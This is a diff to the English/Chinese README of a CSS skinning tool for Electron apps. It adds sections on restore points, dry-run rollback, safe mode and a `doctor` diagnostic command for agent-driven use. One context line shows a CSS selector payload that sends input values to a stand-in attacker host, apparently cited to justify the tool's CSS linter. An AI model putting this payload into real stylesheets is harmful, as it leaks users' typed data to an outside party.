@@ -11,7 +11,8 @@
 [Download](https://github.com/LinzOpen/dsh-skin/releases/latest) ·
 [Skin format](docs/skin-format.md) ·
 [Make your app skinnable](docs/hosts.md) ·
-[Why CSS needs a linter](docs/security.md)
+[Why CSS needs a linter](docs/security.md) ·
+[When it breaks](docs/agent-recovery.md)
 
 </div>
 
@@ -41,6 +42,30 @@ full-window `infinite` animations (measured: **2.5% → 111% CPU** on one host) 
 to compiled class names like `.pI_x6G_frame`, which change on the host's next build.
 
 <img src="docs/images/studio-dark.png" alt="Studio, dark preview">
+
+## When something breaks
+
+More and more people run software like this entirely through an AI agent. So the failure that
+matters is not a crash — it is: the agent does something wrong, the agent's session ends, and the
+person left holding it does not write code.
+
+That case is designed for, not apologised for:
+
+- **Every change writes a restore point first.** Applying a skin, creating one, importing images,
+  deleting one — a snapshot is taken before, automatically. Nobody has to remember.
+- **Rollback never deletes.** It writes files back and recreates missing ones. Skins added after the
+  snapshot are left alone and listed in the report. Undo cannot become the second accident.
+- **It shows you what it will do first.** `undo` is a dry run until you pass `--yes`.
+- **Two failed launches trip safe mode automatically.** No skin, no rotation, nothing to click.
+  Double-click a third time and you are in.
+- **The rescue path does not need the app.** `npx @dsh-skin/cli doctor` reads the same files the app
+  does, so it works when the app will not open.
+- **`doctor --json` is written for an agent to read.** Every non-ok finding carries the command that
+  fixes it, so the next agent can pick up a situation it did not create.
+
+出事之后的完整说明、以及一段可以直接复制给任何 AI 助手的话：[docs/agent-recovery.md](docs/agent-recovery.md)
+
+<img src="docs/images/recovery.png" alt="恢复页">
 
 ## Install
 
@@ -95,6 +120,17 @@ await skins.apply("midnight-harbor");
 ```
 
 That is the whole integration. Details and the DSH plugin adapter: [docs/hosts.md](docs/hosts.md).
+
+## When it goes wrong · 出事之后
+
+```bash
+npx @dsh-skin/cli doctor          # 现在什么状况，每条带修复命令
+npx @dsh-skin/cli undo            # 预演回退（不动手）
+npx @dsh-skin/cli undo --yes      # 真的回退
+npx @dsh-skin/cli safe-mode on    # 下次启动不套任何皮肤
+```
+
+程序里也有同样的一页（顶部「恢复」页签）。全部细节：[docs/agent-recovery.md](docs/agent-recovery.md)
 
 ## Layout
 
@@ -171,6 +207,24 @@ input[value^="a"] { background: url(https://attacker.example/?a); }
 ## 让你自己的 Electron 应用能换皮肤
 
 三行（见上面英文段的代码块），细节和 DSH 插件适配器在 [docs/hosts.md](docs/hosts.md)。
+
+## 出事之后
+
+越来越多人是**完全通过 AI agent** 来用这类软件的。所以真正要防的失败不是崩溃，
+而是：agent 做错了一件事，然后那个会话结束了，而剩下的这个人不写代码。
+
+这个场景是被设计过的，不是被道歉过的：
+
+- **每次改动之前自动存还原点**（套用、新建、导入、删除都是），不指望谁记得。
+- **回退永远不删东西** —— 只写回和补建。快照之后新增的皮肤原样保留并在报告里列出来。
+  恢复本身不能变成第二次事故。
+- **先给你看它要改什么**，你确认了才动手（命令行里不加 `--yes` 就只是预演）。
+- **连续两次启动失败自动进安全模式** —— 不套皮肤、不轮播，不需要点任何东西，多双击一次就进去了。
+- **救援不依赖程序能打开**：`npx @dsh-skin/cli doctor` 读的是同一批文件。
+- **`doctor --json` 是写给 agent 读的** —— 每条非正常的结论都带着修它的那条命令，
+  所以下一个 agent 能接住一个不是它造成的现场。
+
+完整说明和一段可以直接复制给任何 AI 助手的话：[docs/agent-recovery.md](docs/agent-recovery.md)
 
 ## 贡献
 
